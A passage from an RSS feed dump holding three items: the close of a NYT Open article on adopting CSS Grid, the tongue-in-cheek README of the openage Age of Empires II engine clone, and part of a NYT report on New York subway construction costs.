+&lt;p name=&quot;bb9d&quot; id=&quot;bb9d&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;CSS Grid isn’t a hack, it’s a proper layout tool for the web. You don’t need to install anything, you don’t need a preprocessor, and you don’t need to twist your brain into knots just to understand how it works.&lt;/p&gt;
+&lt;p name=&quot;f65f&quot; id=&quot;f65f&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Using CSS Grid doesn’t mean writing throwaway code — the throwaway code will be the old code you’ll want to delete when the timing is right, and that will be much sooner than you think: Chrome, Firefox and Safari all support CSS Grid, and soon Edge 16 will support CSS Grid, too.&lt;/p&gt;
+&lt;h4 name=&quot;c21b&quot; id=&quot;c21b&quot; class=&quot;graf graf--h4 graf--startsWithDoubleQuote graf-after--p&quot;&gt;“That’s nice in theory, but what about in practice?”&lt;/h4&gt;
+&lt;p name=&quot;cc84&quot; id=&quot;cc84&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;Turns out, it’s pretty great in practice, too. I implemented this CSS Grid progressive enhancement on &lt;a href=&quot;https://www.nytimes.com/watching&quot; data-href=&quot;https://www.nytimes.com/watching&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;The New York Times Watching&lt;/a&gt; media card component. Users on old browsers see Bootstrap, but users on browsers that support the display: grid property get the CSS Grid enhanced styles including the thin column gutters that our designers envisioned. Plus, next time there’s a redesign, our designers know they aren’t beholden to the old way of doing layout on the web. It may not look like it right now, but it’s actually a major step forward.&lt;/p&gt;
+&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;
+
+&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*eXuA5NjVlTfUb5RPJjIP7g.png&quot; data-width=&quot;1460&quot; data-height=&quot;1294&quot; data-is-featured=&quot;true&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*eXuA5NjVlTfUb5RPJjIP7g.png&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*eXuA5NjVlTfUb5RPJjIP7g.png&quot;/&gt;&lt;/div&gt;
+&lt;a href=&quot;https://www.nytimes.com/watching/search?mood=strong-female-lead&quot; data-href=&quot;https://www.nytimes.com/watching/search?mood=strong-female-lead&quot; class=&quot;markup--anchor markup--figure-anchor&quot; rel=&quot;nofollow noopener noopener&quot; target=&quot;_blank&quot;&gt;https://www.nytimes.com/watching/search?mood=strong-female-lead&lt;/a&gt;
+&lt;h4 name=&quot;6e25&quot; id=&quot;6e25&quot; class=&quot;graf graf--h4 graf--startsWithDoubleQuote graf-after--figure&quot;&gt;&lt;strong class=&quot;markup--strong markup--h4-strong&quot;&gt;“Ok, I’m convinced! Where do I go next?”&lt;/strong&gt;&lt;/h4&gt;
+&lt;p name=&quot;53ad&quot; id=&quot;53ad&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;There are so many great resources out there! Personally, I recommend checking out the following:&lt;/p&gt;
+&lt;p name=&quot;4ae6&quot; id=&quot;4ae6&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;&lt;strong class=&quot;markup--strong markup--p-strong&quot;&gt;Online Resources:&lt;/strong&gt; Amazing work done by &lt;a href=&quot;https://twitter.com/jensimmons&quot; data-href=&quot;https://twitter.com/jensimmons&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;Jen Simmons&lt;/a&gt; (labs.jensimmons.com) and &lt;a href=&quot;https://twitter.com/rachelandrew&quot; data-href=&quot;https://twitter.com/rachelandrew&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;Rachel Andrew&lt;/a&gt; (rachelandrew.co.uk). Both are experts on CSS Grid and I am grateful for their hard work in pushing the web forward.&lt;/p&gt;
+&lt;p name=&quot;4c4d&quot; id=&quot;4c4d&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;&lt;strong class=&quot;markup--strong markup--p-strong&quot;&gt;In Person&lt;/strong&gt;: If you’re like me and are a fan of conferences, how about going to &lt;a href=&quot;http://2017.cssdevconf.com/&quot; data-href=&quot;http://2017.cssdevconf.com/&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;CSS Dev Conf &lt;/a&gt;? It’s awesome (I’ve been 3 times now), and as a bonus, it’s in New Orleans this year. If you go, make sure you attend &lt;a href=&quot;https://twitter.com/brendamarienyc&quot; data-href=&quot;https://twitter.com/brendamarienyc&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;Brenda Storer’s&lt;/a&gt; &lt;a href=&quot;http://cssdevconf2017.sched.com/event/Anj9/using-css-grid-in-the-real-world&quot; data-href=&quot;http://cssdevconf2017.sched.com/event/Anj9/using-css-grid-in-the-real-world&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;talk on CSS Grid&lt;/a&gt; or &lt;a href=&quot;https://twitter.com/mirisuzanne&quot; data-href=&quot;https://twitter.com/mirisuzanne&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;Miriam Suzanne’s&lt;/a&gt; talk on &lt;a href=&quot;https://cssdevconf2017.sched.com/event/Anir/dont-use-my-grid-system-or-any-others&quot; data-href=&quot;https://cssdevconf2017.sched.com/event/Anir/dont-use-my-grid-system-or-any-others&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;CSS grid systems.&lt;/a&gt;&lt;/p&gt;
+&lt;p name=&quot;20eb&quot; id=&quot;20eb&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;&lt;strong class=&quot;markup--strong markup--p-strong&quot;&gt;Codepen:&lt;/strong&gt; Check out this &lt;a href=&quot;https://codepen.io/collection/XRRJGq/&quot; data-href=&quot;https://codepen.io/collection/XRRJGq/&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;CSS Grid Codepen collection&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/stacykvernmo&quot; data-href=&quot;https://twitter.com/stacykvernmo&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;Stacy Kvernmo&lt;/a&gt;.&lt;/p&gt;
+&lt;p name=&quot;e5dd&quot; id=&quot;e5dd&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;&lt;strong class=&quot;markup--strong markup--p-strong&quot;&gt;DIY:&lt;/strong&gt; Download Firefox and start using their handy grid inspection tool — it looks like a little waffle icon right next to display: grid in the inspector. Trust me, being able to visualize the changes you’re making is key. Visit some websites that are already using CSS Grid in production, inspect, and play around in the browser dev tools. A great place to start is the very instructional &lt;a href=&quot;http://labs.jensimmons.com/&quot; data-href=&quot;http://labs.jensimmons.com/&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;labs.jensimmons.com&lt;/a&gt;.&lt;/p&gt;
+&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;
+
+&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*YRE-ZHEt_Dh8T6njCUP99A.png&quot; data-width=&quot;1096&quot; data-height=&quot;124&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*YRE-ZHEt_Dh8T6njCUP99A.png&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*YRE-ZHEt_Dh8T6njCUP99A.png&quot;/&gt;&lt;/div&gt;
+The “waffle” icon in Firefox.
+&lt;h4 name=&quot;cc1e&quot; id=&quot;cc1e&quot; class=&quot;graf graf--h4 graf--startsWithDoubleQuote graf-after--figure&quot;&gt;&lt;strong class=&quot;markup--strong markup--h4-strong&quot;&gt;“Great! I’ve got my resources, I’ve downloaded Firefox, and I’m ready to display: grid… but there is no place in my company’s project where I can try this out for real.”&lt;/strong&gt;&lt;/h4&gt;
+&lt;p name=&quot;c7bb&quot; id=&quot;c7bb&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;There are a couple of good places to start. Do you have anything that’s only used internally? For example, I think one of the &lt;em class=&quot;markup--em markup--p-em&quot;&gt;best&lt;/em&gt; places to start is with your style guide. (If you don’t have a style guide, get one and start documenting your design patterns!) To start, you can lay out your blocks of brand colors with CSS Grid.&lt;/p&gt;
+&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;
+
+&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*_hrfaUunhJtpYCGcM-eIIw.png&quot; data-width=&quot;2010&quot; data-height=&quot;918&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*_hrfaUunhJtpYCGcM-eIIw.png&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*_hrfaUunhJtpYCGcM-eIIw.png&quot;/&gt;&lt;/div&gt;
+Layout your color swatches in your style guide using CSS Grid.
+&lt;p name=&quot;226f&quot; id=&quot;226f&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;Alternatively, you can take a progressive enhancement approach on just one component at a time. Use feature queries to wrap your grid declarations and you’ll be able to start using CSS Grid without having to make sweeping changes to your whole site all at once.&lt;/p&gt;
+&lt;p name=&quot;9df3&quot; id=&quot;9df3&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Start small, start simple, and build it up slowly! I promise it’s worth it.&lt;/p&gt;
+&lt;p name=&quot;8a8f&quot; id=&quot;8a8f&quot; class=&quot;graf graf--p graf-after--p graf--trailing&quot;&gt;I hope you’ll share your work! It’s an exciting time for layout on the web. &lt;strong class=&quot;markup--strong markup--p-strong&quot;&gt;Get creative and make something new.&lt;/strong&gt;&lt;/p&gt;
+</description>
+<pubDate>Fri, 29 Dec 2017 15:46:43 +0000</pubDate>
+<dc:creator>kawera</dc:creator>
+<og:title>From Bootstrap to CSS Grid – Times Open</og:title>
+<og:url>https://open.nytimes.com/bootstrap-to-css-grid-87b3f5f830e4</og:url>
+<og:image>https://cdn-images-1.medium.com/max/1200/1*eXuA5NjVlTfUb5RPJjIP7g.png</og:image>
+<og:description>Despite many clever hacks and creative workarounds, there hasn’t been a simple answer for creating layout on the web. From misusing tables…</og:description>
+<og:type>article</og:type>
+<dc:format>text/html</dc:format>
+<dc:identifier>https://open.nytimes.com/bootstrap-to-css-grid-87b3f5f830e4?pagewanted=all&amp;gi=cdd7e205f89d</dc:identifier>
+</item>
+<item>
+<title>Open-source clone of the Age of Empires II engine</title>
+<link>https://github.com/SFTtech/openage</link>
+<guid isPermaLink="true" >https://github.com/SFTtech/openage</guid>
+<description>&lt;h3&gt;README.md&lt;/h3&gt;
+&lt;article class=&quot;markdown-body entry-content&quot; itemprop=&quot;text&quot;&gt;
+&lt;p&gt;&lt;strong&gt;openage&lt;/strong&gt;: a volunteer project to create a free engine clone of the &lt;em&gt;Genie Engine&lt;/em&gt; used by &lt;em&gt;Age of Empires&lt;/em&gt;, &lt;em&gt;Age of Empires II (HD)&lt;/em&gt; and &lt;em&gt;Star Wars: Galactic Battlegrounds&lt;/em&gt;, comparable to projects like &lt;a href=&quot;https://openmw.org/&quot; rel=&quot;nofollow&quot;&gt;OpenMW&lt;/a&gt;, &lt;a href=&quot;http://openra.net/&quot; rel=&quot;nofollow&quot;&gt;OpenRA&lt;/a&gt;, &lt;a href=&quot;https://openttd.org/&quot; rel=&quot;nofollow&quot;&gt;OpenTTD&lt;/a&gt; and &lt;a href=&quot;https://openrct2.org/&quot; rel=&quot;nofollow&quot;&gt;OpenRCT2&lt;/a&gt;. At the moment we focus our efforts on the integration of &lt;em&gt;Age of Empires II&lt;/em&gt;, while being primarily aimed at POSIX platforms such as &lt;strong&gt;GNU/Linux&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;openage uses the original game assets (such as sounds and graphics), but (for obvious reasons) doesn't ship them. To play, you require &lt;em&gt;an original AoE II : TC installation or &lt;a href=&quot;http://store.steampowered.com/app/221380/&quot; rel=&quot;nofollow&quot;&gt;AoE II: HD&lt;/a&gt;&lt;/em&gt; (installation via &lt;a href=&quot;https://www.winehq.org/&quot; rel=&quot;nofollow&quot;&gt;Wine&lt;/a&gt; or &lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/doc/media_convert.md#how-to-use-the-original-game-assets&quot;&gt;Steam-Linux&lt;/a&gt;).&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/SFTtech/openage/stargazers&quot;&gt;&lt;img src=&quot;https://camo.githubusercontent.com/8b6b18e5ad5a22079dee44e95ed1613b6dcd11ee/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73746172732f534654746563682f6f70656e6167652e737667&quot; alt=&quot;github stars&quot; data-canonical-src=&quot;https://img.shields.io/github/stars/SFTtech/openage.svg&quot;/&gt;&lt;/a&gt; &lt;a href=&quot;https://webchat.freenode.net/?channels=sfttech&quot; rel=&quot;nofollow&quot;&gt;&lt;img src=&quot;https://camo.githubusercontent.com/04b58bb100f0d3039e763aadffa01f15562ecbb0/68747470733a2f2f696d672e736869656c64732e696f2f467265656e6f64652f253233736674746563682e706e67&quot; alt=&quot;#sfttech on Freenode&quot; data-canonical-src=&quot;https://img.shields.io/Freenode/%23sfttech.png&quot;/&gt;&lt;/a&gt; &lt;a href=&quot;https://riot.im/app/#/room/#sfttech:matrix.org&quot; rel=&quot;nofollow&quot;&gt;&lt;img src=&quot;https://camo.githubusercontent.com/73ca47236cfbbccd75dd4d698c573603c434149a/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6d61747269782d253233736674746563682d626c75652e737667&quot; alt=&quot;#sfttech on matrix.org&quot; data-canonical-src=&quot;https://img.shields.io/badge/matrix-%23sfttech-blue.svg&quot;/&gt;&lt;/a&gt; &lt;a href=&quot;http://www.emergencykitten.com/&quot; rel=&quot;nofollow&quot;&gt;&lt;img src=&quot;https://camo.githubusercontent.com/850415116bb69b1cbdfba3b424e5e2508052228a/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f637574656e6573732d6f7665726c6f61642d6f72616e67652e737667&quot; alt=&quot;quality badge&quot; data-canonical-src=&quot;https://img.shields.io/badge/cuteness-overload-orange.svg&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;The foundation of &lt;strong&gt;openage&lt;/strong&gt;:&lt;/p&gt;
+&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Technology&lt;/th&gt;
+&lt;th&gt;Component&lt;/th&gt;
+&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;C++17&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Engine core&lt;/td&gt;
+&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Python3&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Scripting, media conversion, in-game console, code generation&lt;/td&gt;
+&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Qt5&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Graphical user interface&lt;/td&gt;
+&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Cython&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Glue code&lt;/td&gt;
+&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;CMake&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Build system&lt;/td&gt;
+&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;OpenGL2.1&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Rendering, shaders&lt;/td&gt;
+&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;SDL2&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Cross-platform Audio/Input/Window handling&lt;/td&gt;
+&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Opus&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Audio codec&lt;/td&gt;
+&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;a href=&quot;https://github.com/SFTtech/nyan&quot;&gt;&lt;strong&gt;nyan&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;Content Configuration and Modding&lt;/td&gt;
+&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Humans&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Mixing together all of the above&lt;/td&gt;
+&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;Our goals &lt;em&gt;include&lt;/em&gt;:&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;Fully authentic look and feel
+&lt;ul&gt;&lt;li&gt;This can only be approximated, since the behaviour of the original game is mostly undocumented, and guessing/experimenting can only get you this close&lt;/li&gt;
+&lt;li&gt;We will not implement useless artificial limitations (max 30 selectable units...)&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;Multiplayer (obviously)&lt;/li&gt;
+&lt;li&gt;Matchmaking and ranking with a &lt;a href=&quot;https://github.com/SFTtech/openage-masterserver&quot;&gt;haskell masterserver&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Optionally, &lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/doc/ideas&quot;&gt;improvements&lt;/a&gt; over the original game&lt;/li&gt;
+&lt;li&gt;AI scripting in Python, you can use &lt;a href=&quot;http://scikit-learn.org/stable/&quot; rel=&quot;nofollow&quot;&gt;machine learning&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Re-creating &lt;a href=&quot;https://github.com/SFTtech/openage-data&quot;&gt;free game assets&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;An easily-moddable content format: &lt;a href=&quot;https://github.com/SFTtech/nyan&quot;&gt;&lt;strong&gt;nyan&lt;/strong&gt; yet another notation&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;An integrated Python console and API, comparable to &lt;a href=&quot;https://www.blender.org/&quot; rel=&quot;nofollow&quot;&gt;blender&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Awesome infrastructure such as our own &lt;a href=&quot;https://github.com/SFTtech/kevin&quot;&gt;Kevin CI service&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;But beware, for sanity reasons:&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;No network compatibility with the original game. You really wanna have the same problems again?&lt;/li&gt;
+&lt;li&gt;No binary compatibility with the original game. A one-way script to convert maps/savegames/missions to openage is planned though.&lt;/li&gt;
+&lt;/ul&gt;&lt;h2&gt;Current State of the Project&lt;/h2&gt;
+&lt;ul&gt;&lt;li&gt;
+&lt;p&gt;What features are currently implemented?&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;What's the plan?&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;&lt;h2&gt;Dependencies, Building and Running&lt;/h2&gt;
+&lt;ul&gt;&lt;li&gt;
+&lt;p&gt;How do I get this to run on my box?&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;I compiled everything. Now how do I run it?&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;Execute &lt;code&gt;./run&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/doc/media_convert.md&quot;&gt;The convert script&lt;/a&gt; will transform original assets into openage formats, which are a lot saner and more moddable.&lt;/li&gt;
+&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;Use your brain and react to the things you'll see.&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Waaaaaah! It&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;segfaults&lt;/li&gt;
+&lt;li&gt;prints error messages I don't want to read&lt;/li&gt;
+&lt;li&gt;ate my dog&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;All of those are features, not bugs.&lt;/p&gt;
+&lt;p&gt;To turn them off, use &lt;code&gt;./run --dont-segfault --no-errors --dont-eat-dog&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;If this still does not help, try our &lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/doc/troubleshooting.md&quot;&gt;troubleshooting guide&lt;/a&gt;, the &lt;a href=&quot;https://github.com/SFTtech/openage#contact&quot;&gt;contact section&lt;/a&gt; or the &lt;a href=&quot;https://github.com/SFTtech/openage/issues&quot;&gt;bug tracker&lt;/a&gt;.&lt;/p&gt;
+&lt;h2&gt;Development Process&lt;/h2&gt;
+&lt;p&gt;What does openage development look like in practice?&lt;/p&gt;
+&lt;p&gt;Can I help?&lt;/p&gt;
+&lt;p&gt;All documentation is also in this repo:&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;Code documentation is embedded in the sources for Doxygen (see &lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/doc/README.md&quot;&gt;doc readme&lt;/a&gt;).&lt;/li&gt;
+&lt;li&gt;Have a look at the &lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/doc&quot;&gt;doc directory&lt;/a&gt;. This folder tends to outdate when code changes.&lt;/li&gt;
+&lt;/ul&gt;&lt;h2&gt;macOS Version&lt;/h2&gt;
+&lt;p&gt;Running openage on macOS worked in the past, and might or might not work right now.&lt;/p&gt;
+&lt;p&gt;Setting up continuous integration for this platform has some complications. Running a hackintosh VM seems to be not so legal, while buying dedicated hardware for it seems to be not so cheap. If you know of a legal and cost-free way of doing so or want to sponsor a semi-recent Mac Mini, please open a ticket in our issue tracker. Until then, PRs untested on macOS will make their way into the master branch and occasional breakage will occur.&lt;/p&gt;
+&lt;h2&gt;Windows Version&lt;/h2&gt;
+&lt;p&gt;The Windows port of openage is under development.&lt;/p&gt;
+&lt;p&gt;Setting up continuous integration for this platform has problems similar to the OSX version. If you know of a legal and cost-free way of acquiring and running a Windows VM, please open a ticket in our issue tracker. Until then, PRs untested on Windows will make their way into the master branch and occasional breakage will occur.&lt;/p&gt;
+
+&lt;ul&gt;&lt;li&gt;Being typical computer science students, we hate people.&lt;/li&gt;
+&lt;li&gt;Please don't contact us.&lt;/li&gt;
+&lt;li&gt;Nobody likes Age of Empires anyway.&lt;/li&gt;
+&lt;li&gt;None of you is interested in making openage more awesome anyway.&lt;/li&gt;
+&lt;li&gt;We don't want a community.&lt;/li&gt;
+&lt;li&gt;Don't even think about trying to help.&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;Guidelines:&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;No &lt;strong&gt;bug reports&lt;/strong&gt; or &lt;strong&gt;feature requests&lt;/strong&gt;, the game is perfect as is.&lt;/li&gt;
+&lt;li&gt;Don't try to &lt;strong&gt;fix any bugs&lt;/strong&gt;, see above.&lt;/li&gt;
+&lt;li&gt;Don't implement any features, your code is crap.&lt;/li&gt;
+&lt;li&gt;Don't even think about sending a &lt;strong&gt;pull request&lt;/strong&gt;.&lt;/li&gt;
+&lt;li&gt;Please ignore the &lt;a href=&quot;https://github.com/SFTtech/openage/issues?q=is:issue+is:open+label:%22easy%22&quot;&gt;easy tasks&lt;/a&gt; that &lt;a href=&quot;https://github.com/SFTtech/openage/issues?q=is:issue+is:open+label:%22just+do+it%22&quot;&gt;could just be done&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;Absolutely never ever participate in this &lt;a href=&quot;https://www.reddit.com/r/openage/&quot; rel=&quot;nofollow&quot;&gt;boring community&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;Don't note the irony, you idiot.&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;To prevent accidental violation of one of those guidelines, you should &lt;em&gt;never&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;cheers, happy hecking.&lt;/p&gt;
+&lt;h2&gt;Contact&lt;/h2&gt;
+&lt;p&gt;If you have the desire to perform semi-human interaction, join our &lt;strong&gt;Matrix&lt;/strong&gt; or &lt;strong&gt;IRC&lt;/strong&gt; chatroom!&lt;/p&gt;
+&lt;p&gt;Do not hesitate to ping and insult us, we might not see your message otherwise.&lt;/p&gt;
+&lt;p&gt;For all technical discussion (ideas, problems, ...), use the &lt;a href=&quot;https://github.com/SFTtech/openage/issues&quot;&gt;issue tracker&lt;/a&gt;! It's like a mailing list.&lt;/p&gt;
+&lt;p&gt;For other discussions or questions, use our &lt;a href=&quot;https://www.reddit.com/r/openage/&quot; rel=&quot;nofollow&quot;&gt;/r/openage subreddit&lt;/a&gt;!&lt;/p&gt;
+&lt;h2&gt;License&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;GNU GPLv3&lt;/strong&gt; or later; see &lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/copying.md&quot;&gt;copying.md&lt;/a&gt; and &lt;a href=&quot;https://github.com/SFTtech/openage/blob/master/legal/GPLv3&quot;&gt;legal/GPLv3&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;I know that probably nobody is ever gonna look at the &lt;code&gt;copying.md&lt;/code&gt; file, but if you want to contribute code to openage, please take the time to skim through it and add yourself to the authors list.&lt;/p&gt;
+&lt;/article&gt;</description>
+<pubDate>Fri, 29 Dec 2017 13:17:56 +0000</pubDate>
+<dc:creator>doener</dc:creator>
+<og:image>https://avatars0.githubusercontent.com/u/1783325?s=400&amp;v=4</og:image>
+<og:type>object</og:type>
+<og:title>SFTtech/openage</og:title>
+<og:url>https://github.com/SFTtech/openage</og:url>
+<og:description>openage - Free (as in freedom) open source clone of the Age of Empires II engine :rocket:</og:description>
+<dc:language>en</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>https://github.com/SFTtech/openage</dc:identifier>
+</item>
+<item>
+<title>The Most Expensive Mile of Subway Track</title>
+<link>https://www.nytimes.com/2017/12/28/nyregion/new-york-subway-construction-costs.html</link>
+<guid isPermaLink="true" >https://www.nytimes.com/2017/12/28/nyregion/new-york-subway-construction-costs.html</guid>
+<description>&lt;h4 class=&quot;story-subheading story-content&quot; data-para-count=&quot;25&quot; data-total-count=&quot;19102&quot;&gt;Swelling ‘Soft’ Costs&lt;/h4&gt;&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;151&quot; data-total-count=&quot;19253&quot; id=&quot;story-continues-22&quot;&gt;The M.T.A.’s high costs are not limited to the companies that build the tunnels. Projects start burning through cash long before construction begins.&lt;/p&gt;
+&lt;div id=&quot;story-ad-9&quot; class=&quot;story-ad ad ad-placeholder nocontent robots-nocontent&quot;&gt;
+
+&lt;a class=&quot;visually-hidden skip-to-text-link&quot; href=&quot;https://www.nytimes.com/2017/12/28/nyregion/new-york-subway-construction-costs.html#story-continues-23&quot;&gt;Continue reading the main story&lt;/a&gt;&lt;/div&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;314&quot; data-total-count=&quot;19567&quot; id=&quot;story-continues-23&quot;&gt;On average, “soft costs” — preliminary design and engineering, plus management while construction is underway — make up about 20 percent of the cost of transit projects in America, according to a 2010 report by the Transportation Research Board. The average is similar in other countries, contractors said.&lt;/p&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;16&quot; data-total-count=&quot;19583&quot;&gt;Not in New York.&lt;/p&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;326&quot; data-total-count=&quot;19909&quot;&gt;The latest federal oversight report for the Second Avenue subway projected soft cost spending at $1.4 billion — one-third of the budget, not including financing expenses. M.T.A. officials said that number was high because it included some costs for design of later phases of the line. But experts said it was still shocking.&lt;/p&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;243&quot; data-total-count=&quot;20152&quot;&gt;“The crazy thing is it’s so high even with everything else,” said Larry Gould, a transit consultant and former M.T.A. subway planner. “If we have three or four times as many workers, how can the percentage for soft costs be so high?”&lt;/p&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;204&quot; data-total-count=&quot;20356&quot;&gt;Soft costs for East Side Access are expected to exceed $2 billion. The project plan called for the hiring of 500 consultants from a dozen different companies, according to a 2009 federal oversight report.&lt;/p&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;388&quot; data-total-count=&quot;20744&quot;&gt;Both the Second Avenue subway and East Side Access projects hired the same main engineering firm: WSP USA, formerly known as Parsons Brinckerhoff. The firm, which designed some of New York’s original subway, has donated hundreds of thousands to politicians in recent years, and has hired so many transit officials that some in the system refer to it as “the M.T.A. retirement home.”&lt;/p&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;320&quot; data-total-count=&quot;21064&quot;&gt;The firm was the only vendor to bid on the engineering contract for the Second Avenue subway, records show. On East Side Access, it is sharing the contract with STV Inc., which recently hired the former M.T.A. chairman Thomas F. Prendergast. The contract was initially for $140 million, but it has grown to $481 million.&lt;/p&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;216&quot; data-total-count=&quot;21280&quot;&gt;WSP USA declined to answer questions. “WSP has undertaken complex and enduring infrastructure projects across the U.S., and the New York region presents unique needs and challenges,” the firm said in a statement.&lt;/p&gt;
